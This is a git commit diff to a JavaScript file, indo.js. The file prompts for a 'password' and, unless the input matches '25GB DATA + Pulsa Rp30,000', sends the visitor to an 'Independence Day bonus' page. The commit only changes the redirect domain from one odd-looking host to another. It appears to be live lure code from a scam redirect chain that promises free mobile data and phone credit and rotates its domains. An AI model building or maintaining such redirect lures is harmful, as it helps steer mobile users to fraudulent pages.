6e09996d2b97d6670480986ad8babb0b0b39c7b5
weallneedgod <darter-deaths2p@icloud.com>
2026-08-15 20:59:13 -1200

    Update indo.js

--- indo.js
+++ indo.js
@@ -5,6 +5,6 @@ password = prompt(
 
 );if (password != '25GB DATA + Pulsa Rp30,000') {
 
-    location.href = 'https://www.squareopener.ink/bonus-perayaan-hari-kemerdekaan';
+    location.href = 'https://www.bendselectke.biz/bonus-perayaan-hari-kemerdekaan';
 
 }
